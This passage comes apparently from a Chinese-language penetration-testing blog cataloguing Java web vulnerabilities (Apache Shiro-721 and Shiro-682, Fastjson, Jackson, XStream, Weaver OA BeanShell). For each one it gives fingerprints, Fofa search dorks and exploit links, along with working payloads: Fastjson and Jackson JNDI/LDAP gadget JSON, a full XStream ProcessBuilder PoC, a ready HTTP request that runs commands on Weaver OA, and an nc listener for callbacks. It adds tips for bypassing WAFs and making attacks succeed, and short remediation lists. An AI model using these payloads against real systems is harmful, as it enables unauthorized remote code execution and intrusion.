8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><h2 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro &lt; 1.4.2</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Apache-Shiro&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165">https://www.anquanke.com/post/id/193165</a></p><p>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog<br><a href="http://www.oniont.cn/index.php/archives/298.html">http://www.oniont.cn/index.php/archives/298.html</a></p><p><strong>6. 漏洞利用</strong></p><p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp">https://github.com/wuppp/shiro_rce_exp</a></p><p><strong>7. 利用技巧</strong></p><p>1.该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用, 看起来不是很好利用</p><p>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥</p><p>所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性</p><p>2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 <code>rememberMe</code></p><p><strong>8. 防护方法</strong></p><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><p>4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p><h2 id="Apache-Shiro-权限绕过漏洞-Shiro-682"><a href="#Apache-Shiro-权限绕过漏洞-Shiro-682" class="headerlink" title="Apache Shiro 权限绕过漏洞 (Shiro-682)"></a>Apache Shiro 权限绕过漏洞 (Shiro-682)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro &lt; 1.5.2</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Apache-Shiro&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p><p><strong>6. 漏洞利用</strong></p><p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p><p><strong>7. 利用技巧</strong></p><p>1.url中间可以尝试添加 <code>../</code> , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞</p><p>关于url解析的问题可以参考以下链接</p><p>A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><p>Tomcat URL解析差异性导致的安全问题 – 先知社区<br><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p><p><strong>8. 防护方法</strong></p><p>1.升级1.5.2版本及以上</p><p>2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.</p><h2 id="Fastjson-反序列化远程代码执行漏洞"><a href="#Fastjson-反序列化远程代码执行漏洞" class="headerlink" title="Fastjson 反序列化远程代码执行漏洞"></a>Fastjson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响</p><p>(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)</p><p><strong>2. 影响组件</strong></p><p>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p><p><strong>3. 漏洞指纹</strong></p><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-number">0</span></code></pre><p>可以通过DOS时间延迟或者报错回显的方式检测</p><p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p><p>fastjson &lt; 1.2.66 版本最新漏洞分析<br><a href="https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q">https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q</a></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/181874">https://www.anquanke.com/post/id/181874</a></p><p><strong>6. 漏洞利用</strong></p><p>1.JDK降级编译</p><p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p><p>源项目中最后一句</p><blockquote><p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p></blockquote><p>这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的<code>.class</code> , 相信可以解决很多小伙伴的问题</p><p><code>javac -source 1.7 -target 1.7 Exploit.java</code></p><p>1.2.47版本以下通杀Poc:</p><p><code>&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;, &quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://asdfasfd/&quot;, &quot;autoCommit&quot;:true&#125;&#125;, age:11&#125;</code></p><p>其中<code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://asdfasfd/&quot;, &quot;autoCommit&quot;:true&#125;</code>也可以替换成其他利用链</p><p>2.优先使用LDAP协议</p><p>根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下</p><blockquote><p>RMI协议的利用方式 在<code>JDK 6u132/7u122/8u113</code> 及以上版本中修复了<br>LDAP协议的利用方式 在<code>JDK 6u211/7u201/8u191</code> 及以上版本中修复了</p></blockquote><p>所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制</p><p>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎<br><a href="https://www.freebuf.com/column/207439.html">https://www.freebuf.com/column/207439.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.如何查看服务器的jdk版本呢, 这里也有个小技巧</p><p><code>nc -lvvp 80#[marshalsec中指定的HTTP端口]</code></p><p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p><p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p><p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericFastJsonRedisSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RedisSerializer</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ParserConfig defaultRedisConfig = <span class="hljs-keyword">new</span> ParserConfig();<span class="hljs-keyword">static</span> &#123; defaultRedisConfig.setAutoTypeSupport(<span class="hljs-literal">true</span>);&#125;</code></pre><p>其他消息队列之类的都是同理</p><p><strong>8. 防护方法</strong></p><p>1.升级Fastjson到最新版(&gt;=1.2.68 新增了safemode, 彻底关闭autotype)<br>2.WAF拦截过滤请求包中的 <code>@type</code>, <code>%u0040%u0074%u0079%u0070%u0065</code>, <code>\u0040type</code>, <code>\x04type</code> 等多种编码的autotype变形</p><p>3.最少升级到1.2.48以上版本且关闭autotype选项</p><p>4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h2 id="Jackson-反序列化远程代码执行漏洞"><a href="#Jackson-反序列化远程代码执行漏洞" class="headerlink" title="Jackson 反序列化远程代码执行漏洞"></a>Jackson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行</p><p><strong>2. 影响组件</strong><br>Jackson</p><p><strong>3. 漏洞指纹</strong></p><p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考</p><p>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7506">https://xz.aliyun.com/t/7506</a></p><p><strong>6. 漏洞利用</strong></p><p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p><p>POC</p><p><code>[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, &#123;&quot;jndiLocation&quot;:&quot;ldap://localhost:43658/Calc&quot;&#125;]</code></p><p><strong>7. 利用技巧</strong></p><p>1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p><p><strong>8. 防护方法</strong></p><p>1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)</p><p>2.确保enableDefaultTyping是关闭的</p><p>3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h2 id="Xstream-反序列化漏洞"><a href="#Xstream-反序列化漏洞" class="headerlink" title="Xstream 反序列化漏洞"></a>Xstream 反序列化漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注</p><p><strong>2. 影响组件</strong></p><p>Xstream &lt;1.4.6, =1.4.10</p><p><strong>3. 漏洞指纹</strong></p><p>xml</p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins%EF%BF%A5%EF%BE%88%EF%BE%A9%EF%BF%A7%EF%BE%94%EF%BE%A8">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p><p><strong>6. 漏洞利用</strong></p><pre><code class="hljs awk">import com.thoughtworks.xstream.XStream;import java.io.IOException;public class Main &#123;<span class="hljs-regexp">//</span> POC1    public static void main(String[] args) throws IOException &#123;            XStream xStream = new XStream();            String payload = <span class="hljs-string">&quot;&lt;sorted-set&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;    &lt;string&gt;foo&lt;/string&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;                &lt;command&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;                    &lt;string&gt;cmd.exe&lt;/string&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;                    &lt;string&gt;/c&lt;/string&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;                &lt;/command&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;            &lt;/target&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;     &lt;action&gt;start&lt;/action&gt;&quot;</span>+                    <span class="hljs-string">&quot;        &lt;/handler&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +                    <span class="hljs-string">&quot;&lt;/sorted-set&gt;\n&quot;</span>;<span class="hljs-regexp">//</span>POC2<span class="hljs-regexp">//</span>        String payload = <span class="hljs-string">&quot;&lt;java.util.PriorityQueue serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;comparator class=\&quot;org.apache.commons.beanutils.BeanComparator\&quot;&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;property&gt;databaseMetaData&lt;/property&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;comparator class=\&quot;java.util.Collections$ReverseComparator\&quot;/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;/comparator&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;/default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;params/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;/default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;iMatchColumns&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;/iMatchColumns&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;strMatchColumns&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;string&gt;foo&lt;/string&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;            &lt;null/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;          &lt;/strMatchColumns&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;        &lt;/default&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;    &lt;com.sun.rowset.JdbcRowSetImpl reference=\&quot;../com.sun.rowset.JdbcRowSetImpl\&quot;/&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;        xStream.fromXML(payload);    &#125;&#125;</code></pre><p><strong>7. 利用技巧</strong></p><p>1.这里 <code>Xstream</code> 同样影响很多使用它的开源组件, 比如<code>Spring</code>系列</p><p>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)<br><a href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages">https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p><p>2.xml 不仅可以xxe, 还能反序列化代码执行</p><p>2.xxe 漏洞用 <code>xxer</code>, 方便快捷</p><p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a></p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p><p><strong>2. 影响组件</strong><br>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><p><code>Set-Cookie: ecology_JSessionId=</code></p><p><code>ecology</code></p><p><code>/weaver/bsh.servlet.BshServlet</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;泛微-协同办公OA&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html">https://www.freebuf.com/vuls/215218.html</a></p><p><a href="https://github.com/beanshell/beanshell">https://github.com/beanshell/beanshell</a></p><p><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p><p><strong>6. 漏洞利用</strong></p><p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /weaver/bsh.servlet.BshServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: xxxxxxxx:<span class="hljs-number">8088</span><span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept</span>-Language: en<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">9</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; Trident/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>)<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">98</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">bsh</span>.script=eval%<span class="hljs-number">00</span>(<span class="hljs-string">&quot;ex&quot;</span>%<span class="hljs-number">2</span>b<span class="hljs-string">&quot;ec(\&quot;whoami\&quot;)&quot;</span>);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</code></pre><p><strong>7. 